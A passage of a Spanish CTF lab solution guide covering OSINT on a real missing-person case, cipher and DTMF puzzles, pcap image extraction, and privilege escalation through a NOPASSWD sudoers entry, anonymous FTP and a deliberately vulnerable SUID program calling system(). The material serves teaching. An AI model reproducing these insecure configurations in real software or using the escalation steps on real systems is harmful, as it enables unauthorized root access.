src="cookbook/media/image66.png"
style="width:1.67361in;height:3.35347in" /><img
src="cookbook/media/image67.png"
style="width:1.84653in;height:3.35347in" /></p>
<p><img src="cookbook/media/image68.png"
style="width:3.4656in;height:3.03403in" /><img
src="cookbook/media/image69.png"
style="width:2.18681in;height:3.02708in" /></p>
<p>En la última foto se aprecia que lleva un tatuaje en el pecho, pero
no es posible distinguirlo.</p>
<p>Encontramos varios enlaces informando de su desaparición:</p>
<ul>
<li><p><a
href="https://www.thevanishedpodcast.com/episodes/2024/12/13/episode-469-anastasia-ferriera">https://www.thevanishedpodcast.com/episodes/2024/12/13/episode-469-anastasia-ferriera</a></p></li>
<li><p><a
href="https://www.sotwe.com/missingpeople47">https://www.sotwe.com/missingpeople47</a></p></li>
<li><p><a
href="https://disappearedblog.com/anastasia-ferriera/">https://disappearedblog.com/anastasia-ferriera/</a></p></li>
</ul>
<p><img src="cookbook/media/image70.png"
style="width:5.90694in;height:2.96042in" /></p>
<p><a
href="https://missingpersonscenter.org/missing-persons-directory/missing-adults/anastasia-karma-ferriera/">https://missingpersonscenter.org/missing-persons-directory/missing-adults/anastasia-karma-ferriera/</a></p>
<p><img src="cookbook/media/image71.png"
style="width:5.90694in;height:2.39375in" /></p>
<p>Pero la ubicación del Tattoo ‘Ferriera’ no es la misma en las dos
webs que lo mencionan.</p>
<p>Si seguimos investigando nos lleva a los siguientes enlaces donde
encontramos la ficha oficial de su desaparición:</p>
<ul>
<li><p><a
href="https://www.namus.gov/MissingPersons/Search#/results">https://www.namus.gov/MissingPersons/Search#/results</a></p></li>
<li><p><a
href="https://www.namus.gov/MissingPersons/Case#/103819?nav">https://www.namus.gov/MissingPersons/Case#/103819?nav</a></p></li>
</ul>
<p><img src="cookbook/media/image72.png"
style="width:5.90694in;height:3.84375in" /></p>
<p>Anastasia desapareció en el condado de Bernalillo, en Albuqerque,
Nuevo México 87110:</p>
<p><img src="cookbook/media/image73.png"
style="width:5.90694in;height:2.07986in" /></p>
<p>Última ubicación:</p>
<p><a
href="https://www.google.com/maps/place/35%C2%B006&#39;03.6%22N+106%C2%B034&#39;12.7%22W/@35.1009909,-106.5701927,17z/data=!3m1!4b1!4m4!3m3!8m2!3d35.1009909!4d-106.5701927?entry=ttu&amp;g_ep=EgoyMDI1MDcxNi4wIKXMDSoASAFQAw%3D%3D">https://www.google.com/maps/place/35%C2%B006'03.6%22N+106%C2%B034'12.7%22W/@35.1009909,-106.5701927,17z/data=!3m1!4b1!4m4!3m3!8m2!3d35.1009909!4d-106.5701927?entry=ttu&amp;g_ep=EgoyMDI1MDcxNi4wIKXMDSoASAFQAw%3D%3D</a></p>
<p><img src="cookbook/media/image74.png"
style="width:5.90694in;height:3.19792in" /></p>
<p>Se confirma que el tatuaje en su pecho dice:</p>
<p><strong>Ferriera</strong></p>
<p>Este nombre es el objetivo del reto.</p>
<p><span id="_Toc207189855" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Mosca 8 atrapada: 'Ferriera'</mark></p>
<p><span id="_Toc207189856" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>El reto enseña la importancia del análisis de código fuente y la
decodificación de mensajes ocultos.</p></li>
<li><p>Introduce al jugador a la técnica OSINT, cada vez más usada en
ciberseguridad y análisis forense.</p></li>
<li><p>También sensibiliza sobre cómo los datos públicos pueden ayudar
(o exponer) casos reales.</p></li>
</ul>
<p><strong><br />
</strong></p>
<h1 id="mosca-9-reconocimiento-de-tonos-dtmf-en-audio"><strong>🐝 Mosca
9 – Reconocimiento de Tonos DTMF en Audio</strong></h1>
<p><strong>Categoría:</strong> Esteganografía auditiva / DTMF /
Ingeniería inversa<br />
<strong>Nivel:</strong> Avanzado<br />
<strong>Mosca capturada:</strong> 378282246310005</p>
<p><span id="_Toc207189858" class="anchor"></span><strong>🧰
Herramientas necesarias</strong></p>
<ul>
<li><p>Generador DTMF (por ejemplo, <a
href="https://onlinesound.net/dtmf-generator"><u>onlinesound.net/dtmf-generator</u></a>)</p></li>
<li><p>Reproductor de audio (Audacity, VLC, etc.)</p></li>
<li><p>Decoder online de DTMF: <a
href="https://dtmf.netlify.app/"><u>dtmf.netlify.app</u></a></p></li>
<li><p>Archivo de audio llamada.wav (simulado para el reto)</p></li>
</ul>
<p><span id="_Toc207189859" class="anchor"></span><strong>📜 Pista
inicial</strong></p>
<p>En el código fuente de la página nosotros.html encontramos una pista
que dice:</p>
<p>&lt;!--</p>
<p>🐔</p>
<p>Tj MNJ pj nvlxvcajmx dvj yqbcj nv nt jdmqx ttjujmj.fje. Bn pj ujaljmx
nt lómqox mn dvj cjarncj mn laémqcx yjaj anjtqija dvj cajvbñnanvlqj
¿Ldát nb nt lómqox mn tj cjarncj mn laémqcx? Nt vúunax lxuytncx mn tj
cjarncj nb tj Uxblj 9</p>
<p>--&gt;</p>
<p>Es razonable sospechar que se trata de un cifrado César por varias
razones:</p>
<p><strong>🧩 ¿Cómo saber que es un cifrado César?</strong></p>
<ol type="1">
<li><p>Estructura gramatical similar al español:</p></li>
</ol>
<ul>
<li><p>Aunque las palabras no tienen sentido directamente, mantienen una
longitud y estructura similar al español.</p></li>
<li><p>Por ejemplo: “Tj MNJ pj” parece tener la misma estructura que “El
ABC es”.</p></li>
</ul>
<ol start="2" type="1">
<li><p>Distribución de palabras:</p></li>
</ol>
<ul>
<li><p>El patrón de uso de artículos, preposiciones y signos de
puntuación es típico del español.</p></li>
<li><p>Hay una frase que termina en “¿...?”, típica en
preguntas.</p></li>
</ul>
<ol start="3" type="1">
<li><p>No hay signos especiales ni palabras muy largas:</p></li>
</ol>
<ul>
<li><p>No parece un cifrado complejo (como Vigenère o RSA), sino algo
simple y por sustitución.</p></li>
</ul>
<ol start="4" type="1">
<li><p>Es uno de los cifrados más comunes en textos de ejemplo:</p></li>
</ol>
<ul>
<li><p>El cifrado César es uno de los primeros que se prueban al
analizar criptogramas de este tipo.</p></li>
</ul>
<p><strong>🛠 ¿Qué es el cifrado César?</strong></p>
<p>Es un cifrado por sustitución en el que cada letra se reemplaza por
otra un número fijo de posiciones más adelante en el alfabeto.</p>
<p>Por ejemplo, con un desplazamiento de +1:</p>
<p>A → B</p>
<p>B → C</p>
<p>C → D</p>
<p>…</p>
<p>Z → A</p>
<p><strong>✅ ¿Cómo confirmar si es un cifrado César?</strong></p>
<p>Para comprobarlo se pueden usar herramientas automáticas o hacerlo
manualmente:</p>
<ul>
<li><p>Probar desplazamientos del 1 al 25 (un ataque por fuerza
bruta).</p></li>
<li><p>Leer el resultado de cada uno y ver cuál tiene sentido en
español.</p></li>
</ul>
<p>Existen herramientas online como:</p>
<p><a
href="https://www.dcode.fr/caesar-cipher">https://www.dcode.fr/caesar-cipher</a></p>
<p>El Cifrado de Caesar es uno de los métodos de codificación conocidos
más antiguos. Es muy simple - sólo se cambian las posiciones del
alfabeto. La transformación se denomina ROTN, donde N es el valor de
cambio de posiciones y ROT significa "ROTAR", porque es un cambio
cíclico.</p>
<p>Por ejemplo, ROT2 significa que "a" se vuelve "c", "b" se vuelve "d"
y al final "y" se vuelve "a", y "z" se vuelve "b". La cantidad de
transformaciones posibles depende de la longitud del alfabeto. Debido a
eso, es un método muy débil, ya que puedes revisar todas las
combinaciones posibles de manera muy rápida.</p>
<p>En este caso se ha aplicado ROT9</p>
<p>&lt;!--</p>
<p>🐔</p>
<p>La DEA ha encontrado una pista en el audio llamada.wav. Se ha marcado
el código de una tarjeta de crédito para realizar una transferencia
¿Cuál es el código de la tarjeta de crédito? El número completo de la
tarjeta es la Mosca 9</p>
<p>--&gt;</p>
<p>En el código fuente de nosotros.html, tras aplicar un cifrado César
con ROT9, se revela este mensaje:</p>
<p>La DEA ha encontrado una pista en el audio llamada.wav. Se ha marcado
el código de una tarjeta de crédito para realizar una transferencia.
¿Cuál es el código de la tarjeta de crédito? El número completo de la
tarjeta es la Mosca 9.</p>
<p><span id="_Toc207189860" class="anchor"></span><strong>🧪
Procedimiento técnico</strong></p>
<p><strong>1. Reproducir y analizar llamada.wav</strong></p>
<p>En la carpeta “archivos” podemos encontrar el archivo
llamada.wav.</p>
<p>Este archivo simula el sonido de una tarjeta de crédito digitada por
tonos telefónicos (DTMF). Los tonos DTMF son combinaciones de
frecuencias que representan los dígitos del 0 al 9.</p>
<p>Lo ideal es usar tonos DTMF (Dual-Tone Multi-Frequency). Estos son
los tonos que usan los teléfonos al marcar números, y son fácilmente
reconocibles por sistemas automáticos y humanos.</p>
<p><strong>1. Tipo de tono</strong></p>
<p>• Se ha usado DTMF (Dual Tone Multi-Frequency). Es el tipo correcto
de señal para simular la pulsación de teclas numéricas en un
teléfono.</p>
<p><strong>2. Duración de cada tono</strong></p>
<p>• Se recomienda usar una duración entre 100 y 250 ms por tono para
que sea claro y reconocible, pero no muy lento.</p>
<p>Ejemplo común: Tono: 200 ms y Pausa: 100 ms.</p>
<p><strong>3. Contenido simulado</strong></p>
<p>Una tarjeta de crédito tiene 16 dígitos, separados normalmente en
grupos de 4. En este caso tenemos 15 dígitos.</p>
<p>Se ha usado el código de una tarjeta de Américan express.</p>
<p><strong>¿Cómo sabemos que es una Américan Express?:</strong></p>
<p>Longitud: 15 dígitos (las AmEx tienen 15 dígitos, no 16).</p>
<p>Empieza por 34 o 37 (en este caso, 37), como todas las tarjetas
AmEx.</p>
<p>Formato típico: 4-6-5 (como en el ejemplo).</p>
<p>Este número pasa la verificación de Luhn, que es el algoritmo que
valida la estructura de las tarjetas, pero no es un número real ni está
asociado a ninguna cuenta.</p>
<p>Usamos el sitio <a
href="https://dtmf.netlify.app/"><u>dtmf.netlify.app</u></a> para cargar
el audio y obtener la secuencia numérica:</p>
<p><img src="cookbook/media/image75.png"
style="width:5.20332in;height:2.37955in" /></p>
<p><strong>2. Resultado del análisis</strong></p>
<p>El decodificador devuelve esta secuencia:</p>
<p>378282246310005</p>
<p>3782 822463 10005</p>
<p>Este número tiene la estructura de una tarjeta de crédito
<strong>American Express</strong> (formato 4-6-5). Aunque no es real,
pasa la validación por el algoritmo de Luhn.</p>
<p><span id="_Toc207189861" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Mosca 9 atrapada: '378282246310005'</mark></p>
<p><span id="_Toc207189862" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>Este reto introduce técnicas de análisis de señal y
espectrograma.</p></li>
<li><p>Enseña cómo se pueden ocultar datos en audio utilizando
estándares como DTMF.</p></li>
<li><p>Combina seguridad, cripto, y audio en una experiencia
completa.</p></li>
</ul>
<p><strong><br />
</strong></p>
<h1 id="mosca-10-reconstrucción-de-jpeg-desde-tráfico-http"><strong>🐝
Mosca 10 – Reconstrucción de JPEG desde tráfico HTTP</strong></h1>
<p><strong>Categoría:</strong> Análisis de red / Forense /
Esteganografía<br />
<strong>Nivel:</strong> Avanzado<br />
<strong>Mosca capturada:</strong> WALTER_WHITE</p>
<p><span id="_Toc207189864" class="anchor"></span><strong>🧰
Herramientas necesarias</strong></p>
<ul>
<li><p><strong>Wireshark</strong></p></li>
<li><p><strong>Servidor web local</strong> (python -m
http.server)</p></li>
<li><p>Fichero de captura: http_jpeg.pcap</p></li>
</ul>
<p><span id="_Toc207189865" class="anchor"></span><strong>📜 Pista
inicial</strong></p>
<p>En el código fuente de la página nosotros.html encontramos una pista
que dice:</p>
<p>&lt;!--</p>
<p>🐔</p>
<p>Oz WVZ sz vnxlngizwl fnz ulgl xlñl krhgz. Oz xzkgfiz wv giáurxl wv
ivw sggk_qkvt vhxlnwv oz Ñlhxz 10</p>
<p>--&gt;</p>
<p>El cifrado <strong>Atbash</strong> es menos común que el César, pero
tiene características bastante distintivas que pueden hacernos sospechar
que un texto está cifrado con este sistema.</p>
<p><strong>🔎 ¿Qué es el cifrado Atbash?</strong></p>
<p>El cifrado <strong>Atbash</strong> es un cifrado monoalfabético por
sustitución donde cada letra se reemplaza por su "opuesta" en el
alfabeto.</p>
<p>En el alfabeto latino:</p>
<p>A ↔︎ Z</p>
<p>B ↔︎ Y</p>
<p>C ↔︎ X</p>
<p>D ↔︎ W</p>
<p>...</p>
<p>M ↔︎ N</p>
<p>Es un tipo de cifrado simétrico y sin clave, ya que codificar y
decodificar es el mismo proceso.</p>
<p><strong>🧠 ¿Qué hace sospechar que este texto esté cifrado con
Atbash?</strong></p>
<ol type="1">
<li><p>Patrón de letras poco frecuentes:</p>
<ul>
<li><p>El texto contiene muchas letras como x, z, v, w, g, k, que no son
tan comunes en español.</p></li>
<li><p>En Atbash, como cambia una letra por su opuesta, las letras más
frecuentes (como A, E, O) se convierten en letras menos frecuentes (Z,
V, L, etc.), alterando notablemente la distribución habitual de
letras.</p></li>
</ul></li>
<li><p>Simetría visual:</p>
<ul>
<li><p>Las letras en palabras parecen inversas al patrón típico del
español.</p></li>
<li><p>Si lo lees sabiendo que Z=A, Y=B, etc., comienzas a ver posibles
palabras escondidas.</p></li>
</ul></li>
<li><p>Pocas vocales comunes:</p></li>
</ol>
<ul>
<li><p>En español predominan vocales como a, e, o. Este texto tiene más
i, u, z, x, lo que hace pensar en una inversión.</p></li>
</ul>
<ol start="4" type="1">
<li><p>Frases que podrían empezar con "El" → "Oz":</p></li>
</ol>
<ul>
<li><p>Si ves "Oz WVZ sz…", puedes pensar si "Oz" = "El".</p></li>
</ul>
<p>En Atbash:</p>
<p>O → L</p>
<p>Z → A</p>
<p>→ “Oz” = “El”</p>
<p>Confirmado: Sí, es <strong>Atbash</strong>.</p>
<p><strong>✅ En resumen: ¿Por qué sospechar de Atbash?</strong></p>
<ul>
<li><p>Uso inusual de letras poco frecuentes.</p></li>
<li><p>Pocas vocales comunes del español.</p></li>
<li><p>Frases con apariencia de espejo o inversión.</p></li>
<li><p>Simetría y sustitución característica.</p></li>
<li><p>Al invertir con <strong>Atbash</strong>, empiezan a aparecer
palabras coherentes.</p></li>
</ul>
<p>El Cifrado <strong>Atbash</strong> es un método de cifrado de
sustitución monoalfabética que funciona invirtiendo el alfabeto. Esto
significa que la primera letra del alfabeto se reemplaza por la última,
la segunda por la penúltima, y así sucesivamente.</p>
<p><strong>¿Cómo Funciona?</strong></p>
<p>En el cifrado Atbash, cada letra se mapea a su "opuesto" en el
alfabeto. Aquí tienes cómo se vería para el alfabeto latino:</p>
<ul>
<li><p>A se convierte en Z</p></li>
<li><p>B se convierte en Y</p></li>
<li><p>C se convierte en X</p></li>
<li><p>...</p></li>
<li><p>X se convierte en C</p></li>
<li><p>Y se convierte en B</p></li>
<li><p>Z se convierte en A</p></li>
</ul>
<p>Para aplicar el cifrado, simplemente sustituyes cada letra del
mensaje original por su equivalente Atbash. Los números y los caracteres
que no son letras suelen dejarse sin cambios.</p>
<p><strong>Características Clave</strong></p>
<ul>
<li><p>Autoinverso: Una característica única del Atbash es que es
autoinverso. Esto significa que cifrar un mensaje dos veces con Atbash
te devuelve el mensaje original. Si A se convierte en Z, y luego Z se
convierte en A, el proceso se revierte perfectamente.</p></li>
<li><p>Simplicidad: Es uno de los cifrados más simples y antiguos
conocidos.</p></li>
<li><p>Orígenes: Tiene sus raíces en el hebreo antiguo. El nombre
"Atbash" proviene de las dos primeras letras hebreas (Aleph, Tav) y las
dos últimas (Bet, Shin), que son las que se intercambian.</p></li>
</ul>
<p><strong>Ejemplo</strong></p>
<p>Si quieres cifrar la palabra "HOLA" usando Atbash:</p>
<ul>
<li><p>H se convierte en S (H es la 8ª letra, S es la 8ª desde el
final)</p></li>
<li><p>se convierte en L (O es la 15ª letra, L es la 15ª desde el
final)</p></li>
<li><p>L se convierte en O</p></li>
<li><p>A se convierte en Z</p></li>
</ul>
<p>Así, "HOLA" cifrado con Atbash sería "SLOZ".</p>
<p>Usamos un servicio online para descifrarlo:</p>
<p><a
href="https://ciphersonline.com/es/cifrado-atbash">https://ciphersonline.com/es/cifrado-atbash</a></p>
<p><img src="cookbook/media/image76.png"
style="width:5.90694in;height:2.89375in" /></p>
<p>Tras aplicar cifrado Atbash, aparece el siguiente mensaje:</p>
<p>&lt;!--</p>
<p>🐔</p>
<p>La DEA ha encontrado una foto como pista. La captura de tráfico de
red http_jpeg esconde la Mosca 10</p>
<p>--&gt;</p>
<p>Esto nos lleva al archivo de captura http_jpeg.pcap que se encuentra
en la carpeta archivos.</p>
<p><span id="_Toc207189866" class="anchor"></span><strong>🧪
Procedimiento técnico</strong></p>
<p><strong>1. ¿Cómo se ha montado el entorno de captura</strong></p>
<p>En el reto se simula la transferencia de una imagen .jpg mediante
tráfico HTTP. Para recrearlo:</p>
<p>cd carpeta_con_imagen</p>
<p>python -m http.server 8000</p>
<p>Accedemos a http://localhost:8000/imagen.jpg desde el navegador
mientras Wireshark captura.</p>
<p>Es una captura de wireshark que supone un ejemplo de cómo volver a
montar una secuencia HTTP y extraer y guardar en un archivo una imagen
de JPEG desde el interior de un HTTP PDU.</p>
<p><strong>2. Analizar el tráfico en Wireshark</strong></p>
<p>En Wireshark:</p>
<ul>
<li><p>Filtramos con http o tcp.port == 8000</p></li>
<li><p>Buscamos la respuesta HTTP 200 OK que contiene el JPEG</p></li>
<li><p>Localizamos el paquete correspondiente (por ejemplo, línea 347
del http_jpeg.pcap)</p></li>
</ul>
<p><img src="cookbook/media/image77.png"
style="width:5.90694in;height:2.36458in" /></p>
<p><img src="cookbook/media/image78.png"
style="width:5.90556in;height:4.625in" /></p>
<p><strong>3. Exportar la imagen reconstruida</strong></p>
<p>A continuación, hacemos clic derecho en el protocolo JPG y
seleccionamos "Exportar bytes de paquete" y guardarlo en un archivo con
el nombre que queramos y la extensión jpeg.</p>
<p>Export Packet Bytes → Guardar como imagen.jpeg</p>
<p>Esto crea un archivo JPEG que puede visualizarse normalmente.</p>
<p><img src="cookbook/media/image79.png"
style="width:5.09375in;height:1.17986in" /></p>
<p>Ahora puedes abrir la imagen para visualizarla</p>
<p><strong>4. Verificar el contenido oculto</strong></p>
<p>Al abrir la imagen exportada, se revela una imagen con el texto:
<strong>LA MOSCA 10 ES: ‘WALTER_WHITE’.</strong></p>
<p><img src="cookbook/media/image80.png"
style="width:5.90694in;height:3.67361in" /></p>
<p><span id="_Toc207189867" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Mosca 10 atrapada: 'WALTER_WHITE'</mark></p>
<p><span id="_Toc207189868" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>El reto enseña cómo reconstruir archivos desde flujos de red
usando herramientas forenses reales.</p></li>
<li><p>Simula un entorno de captura HTTP de forma controlada.</p></li>
<li><p>Refuerza habilidades en reconocimiento de protocolo, filtrado de
tráfico y exportación de datos binarios.</p></li>
</ul>
<p><strong><br />
</strong></p>
<h1 id="section-3"></h1>
<h1 id="section-4"></h1>
<h1 id="resolución-de-banderas"><strong>Resolución de
Banderas</strong></h1>
<h1 id="section-5"></h1>
<p><img src="cookbook/media/image81.jpeg"
style="width:5.90556in;height:3.37431in" /></p>
<p><strong><br />
</strong></p>
<h1
id="bandera-1-escalada-de-privilegios-mediante-configuración-vulnerable-en-etcsudoers"><strong>🏁
Bandera 1 – Escalada de Privilegios mediante configuración vulnerable en
/etc/sudoers</strong></h1>
<p><strong>Categoría:</strong> Privilege Escalation<br />
<strong>Nivel:</strong> Medio<br />
<strong>Flag:</strong> d41d8cd98f00b204e9800998ecf8427e<br />
<strong>Usuario involucrado:</strong> chow<br />
<strong>Contraseña:</strong> Ch0w$up1</p>
<p><span id="_Toc207189871" class="anchor"></span><strong>🔍 Objetivo
del reto</strong></p>
<p>El jugador debe identificar una configuración insegura en el sistema
que permite al usuario chow ejecutar comandos como root sin necesidad de
introducir la contraseña. Esto le permitirá acceder a un archivo
protegido por root donde se encuentra la bandera.</p>
<p><span id="_Toc207189872" class="anchor"></span><strong>⚙️ Preparación
del entorno realizada</strong></p>
<p>El entorno incluye los siguientes pasos realizados:</p>
<ol type="1">
<li><p><strong>Creación de usuario vulnerable</strong>:</p></li>
</ol>
<blockquote>
<p>sudo useradd -m chow</p>
<p>echo 'chow:Ch0w$up1' | sudo chpasswd</p>
<p><img src="cookbook/media/image82.png"
style="width:5.90556in;height:1.225in" /></p>
</blockquote>
<ol start="2" type="1">
<li><p><strong>Modificación del archivo /etc/sudoers usando
visudo</strong>:</p></li>
</ol>
<blockquote>
<p>chow ALL=(ALL) NOPASSWD:ALL</p>
<p>Esto otorga permisos de superusuario a chow sin necesidad de
contraseña.</p>
<p><img src="cookbook/media/image83.png"
style="width:5.90556in;height:4.42361in" /></p>
</blockquote>
<ul>
<li><p>Se han eliminado privilegios innecesarios de chow.</p></li>
</ul>
<p><span id="_Toc207189873" class="anchor"></span><strong>📁 Bandera
escondida</strong></p>
<p>La bandera se encuentra en:</p>
<p>/root/bandera1.txt</p>
<p>Y su contenido es:</p>
<p>FLAG1{d41d8cd98f00b204e9800998ecf8427e}</p>
<p>Este archivo solo puede ser leído por el usuario root.</p>
<p><span id="_Toc207189874" class="anchor"></span><strong>🧪 Pasos para
capturar la bandera</strong></p>
<p><strong>1️⃣ Conectarse al usuario chow</strong></p>
<p>Usaremos la contraseña de chow encontrada en la fase de
reconocimiento.</p>
<p>Conexión SSH usando la contraseña de chow</p>
<p>Ejecuta el cliente SSH:</p>
<p>ssh chow@192.168.1.44</p>
<p>Cuando te pida la contraseña, introduce:</p>
<p>Ch0w$up1</p>
<p>Verifica que has entrado como chow:</p>
<p>id</p>
<p># uid=1001(chow) gid=1001(chow) grupos=1001(chow)</p>
<p><img src="cookbook/media/image84.png"
style="width:5.90556in;height:4.90556in" /></p>
<p><img src="cookbook/media/image85.png"
style="width:5.90556in;height:0.78125in" /></p>
<p><strong>2️⃣ Escalada a root aprovechando NOPASSWD</strong></p>
<p><strong>Comprueba tus privilegios sudo:</strong></p>
<p>sudo -l</p>
<p># (ALL) NOPASSWD: ALL</p>
<p><img src="cookbook/media/image86.png"
style="width:5.90556in;height:1.8125in" /></p>
<p><strong>Consigue shell root:</strong></p>
<p>sudo su –</p>
<p><img src="cookbook/media/image87.png"
style="width:5.90556in;height:0.51736in" /></p>
<p>✅ ¡Tienes acceso!</p>
<p><strong>3️⃣ Leer la bandera como superusuario</strong></p>
<p>sudo cat /root/bandera1.txt</p>
<p><img src="cookbook/media/image88.png"
style="width:5.90556in;height:2.17292in" /></p>
<p>Salida esperada:</p>
<p>FLAG1{d41d8cd98f00b204e9800998ecf8427e}</p>
<p><span id="_Toc207189875" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>El jugador debe identificar que el archivo contraseña.txt es un
señuelo.</p></li>
<li><p>Con sudo -l, puede descubrir que tiene acceso total sin
contraseña.</p></li>
<li><p>La técnica explotada es una <strong>escalada horizontal que se
convierte en vertical</strong> gracias al mal uso de NOPASSWD.</p></li>
</ul>
<p><span id="_Toc207189876" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Bandera 1 atrapada:
'd41d8cd98f00b204e9800998ecf8427e'</mark></p>
<p><strong><br />
</strong></p>
<h1
id="bandera-2-acceso-anónimo-a-servidor-ftp-con-archivos-ocultos"><strong>🏁
Bandera 2 – Acceso Anónimo a Servidor FTP con Archivos
Ocultos</strong></h1>
<p><strong>Categoría:</strong> Red / Forense<br />
<strong>Nivel:</strong> Básico - Medio<br />
<strong>Flag:</strong> pizza_en_el_tejado<br />
<strong>Usuario involucrado:</strong> Acceso anónimo al servidor FTP</p>
<p><span id="_Toc207189878" class="anchor"></span><strong>🔍 Objetivo
del reto</strong></p>
<p>El jugador debe descubrir un servidor FTP mal configurado que permite
conexión anónima y localizar un archivo .flag escondido en una carpeta
oculta del sistema. La bandera está en texto plano y se revela tras
conectarse correctamente y enumerar los contenidos ocultos.</p>
<p><span id="_Toc207189879" class="anchor"></span><strong>⚙️ Entorno
técnico preparado</strong></p>
<p>El entorno está sobre <strong>Ubuntu Server 14.04.6</strong>, y tiene
las siguientes configuraciones realizadas:</p>
<ul>
<li><p>Paquete instalado:</p></li>
</ul>
<blockquote>
<p>sudo apt-get install vsftpd</p>
</blockquote>
<ul>
<li><p>Configuración del archivo /etc/vsftpd.conf:</p></li>
</ul>
<blockquote>
<p>anonymous_enable=YES</p>
<p>anon_root=/var/ftp</p>
</blockquote>
<ul>
<li><p>Carpeta oculta y bandera creadas:</p></li>
</ul>
<blockquote>
<p>sudo mkdir -p /var/ftp/.hidden</p>
<p>echo "FLAG2{pizza_en_el_tejado}" | sudo tee
/var/ftp/.hidden/bandera2.txt &gt; /dev/null</p>
<p><img src="cookbook/media/image89.png"
style="width:5.90556in;height:0.64583in" /></p>
</blockquote>
<ul>
<li><p>Reinicio del servicio:</p></li>
</ul>
<blockquote>
<p>sudo service vsftpd restart</p>
</blockquote>
<p><img src="cookbook/media/image90.png"
style="width:5.90556in;height:0.54444in" /></p>
<p><span id="_Toc207189880" class="anchor"></span><strong>🧪 Pasos para
capturar la bandera</strong></p>
<p><strong>1️⃣ Escaneo del servicio FTP</strong></p>
<p>El jugador puede usar nmap para descubrir el puerto 21 abierto:</p>
<p>nmap -p 21 192.168.1.44</p>
<p>Verificará que el servicio FTP está activo.</p>
<p><strong>2️⃣ Conexión al servidor como usuario anónimo</strong></p>
<p>Usando el cliente FTP en terminal:</p>
<p>ftp &lt;IP_del_servidor&gt;</p>
<p>Al solicitar usuario, se puede ingresar:</p>
<p>Name (&lt;IP&gt;:user): anonymous</p>
<p>Password: (vacío o cualquier texto)</p>
<p><img src="cookbook/media/image91.png"
style="width:3.94792in;height:2.04167in" /></p>
<p><strong>3️⃣ Enumerar archivos ocultos</strong></p>
<p>Una vez dentro del FTP:</p>
<p>cd .hidden</p>
<p>ls -la</p>
<p><img src="cookbook/media/image92.png"
style="width:5.76042in;height:1.44792in" /></p>
<p><img src="cookbook/media/image93.png"
style="width:5.90556in;height:2.6875in" /></p>
<p>⚠️ En Linux, los archivos y carpetas ocultos normalmente tienen un
punto (.) al inicio de su nombre. Para verlos desde la terminal, puedes
usar el comando ls con la opción -a.</p>
<p>🗂️ Comando útil para listar todo, incluidos ocultos</p>
<p>ls -la /var/ftp</p>
<p>Esto muestra:</p>
<ul>
<li><p>-l: listado detallado con permisos, propietario, tamaño,
etc.</p></li>
<li><p>-a: incluye archivos ocultos (los que comienzan con .)</p></li>
</ul>
<p><strong>4️⃣ Leer el contenido del archivo</strong></p>
<p>Descargamos el fichero con la bandera a la máquina de Kali con:</p>
<p>get bandera2.txt</p>
<p>Salimos del ftp con:</p>
<p>bye</p>
<p><img src="cookbook/media/image94.png"
style="width:5.90556in;height:1.90625in" /></p>
<p>Y mostramos el contenido del fichero:</p>
<p>cat bandera2.txt</p>
<p><img src="cookbook/media/image95.png"
style="width:5.90556in;height:1.0625in" /></p>
<p>Salida esperada:</p>
<p>FLAG2{pizza_en_el_tejado}</p>
<p><span id="_Toc207189881" class="anchor"></span><strong>🧠
Razonamiento técnico</strong></p>
<ul>
<li><p>El reto introduce al jugador al concepto de <strong>acceso
anónimo inseguro</strong>.</p></li>
<li><p>Refuerza buenas prácticas de enumeración (ls -la) para archivos
ocultos.</p></li>
<li><p>Enseña cómo aprovechar configuraciones FTP mal defendidas en
sistemas legacy.</p></li>
</ul>
<p><span id="_Toc207189882" class="anchor"></span><strong>🐞 Resultado
final</strong></p>
<p><mark>Bandera 2 atrapada: 'pizza_en_el_tejado'</mark><strong><br />
</strong></p>
<h1
id="bandera-3-binario-suid-vulnerable-a-comandos-arbitrarios"><strong>🏁
Bandera 3 – Binario SUID Vulnerable a Comandos Arbitrarios</strong></h1>
<p><strong>Categoría:</strong> Pwn / Privilege Escalation<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Flag:</strong> I_am_the_one_who_knocks<br />
<strong>Usuarios involucrados:</strong></p>
<ul>
<li><p>Usuario base: hector / Contraseña:
<strong>XXXXXXXX</strong></p></li>
<li><p>Usuario root (indirecto): fring</p></li>
</ul>
<p><span id="_Toc207189884" class="anchor"></span><strong>🔍 Objetivo
del reto</strong></p>
<p>El jugador inicia como usuario chow, que parece inofensivo. Su misión
es descubrir un binario con permisos <strong>SUID,</strong> en el
directorio de hector, que permite ejecutar comandos arbitrarios con
privilegios de root y así acceder al archivo protegido con la
bandera.</p>
<p>🧠 <strong>¿Qué es un binario con permisos SUID?</strong></p>
<ul>
<li><p>SUID (Set User ID): Es un permiso especial en Linux que, cuando
se aplica a un archivo ejecutable, hace que ese archivo se ejecute con
los privilegios del dueño del archivo (normalmente root).</p></li>
<li><p>Eso significa que si un usuario normal ejecuta un binario con
SUID y el binario pertenece a root, el binario se ejecutará <strong>como
si fuera root</strong>.</p></li>
</ul>
<p><span id="_Toc207189885" class="anchor"></span><strong>⚙️ Entorno
técnico preparado</strong></p>
<p>Crear un usuario como hector con mínimos privilegios es una muy buena
práctica para simular un entorno de escalada de privilegios o
simplemente para limitar el acceso de forma segura:</p>
<ol type="1">
<li><p>Usuario hector creado sin privilegios:</p></li>
</ol>
<blockquote>
<p>sudo useradd -m hector</p>
<p>echo 'hector:<strong>XXXXXXXX</strong>' | sudo chpasswd</p>
</blockquote>
<ol start="2" type="1">
<li><p>Binario vulnerable creado en /home/hector/:</p>
<ul>
<li><p><strong>Código fuente (suid_vuln.c):</strong></p></li>
</ul></li>
</ol>
<blockquote>
<p>#include &lt;stdio.h&gt;</p>
<p>#include &lt;stdlib.h&gt;</p>
<p>int main() {</p>
<p>char comando[100];</p>
<p>printf("Introduce el comando:\n");</p>
<p>fgets(comando, sizeof(comando), stdin);</p>
<p>system(comando);</p>
<p>return 0;</p>
<p>}</p>
<p><img src="cookbook/media/image96.png"
style="width:5.28125in;height:2.07917in" /></p>
</blockquote>
<ul>
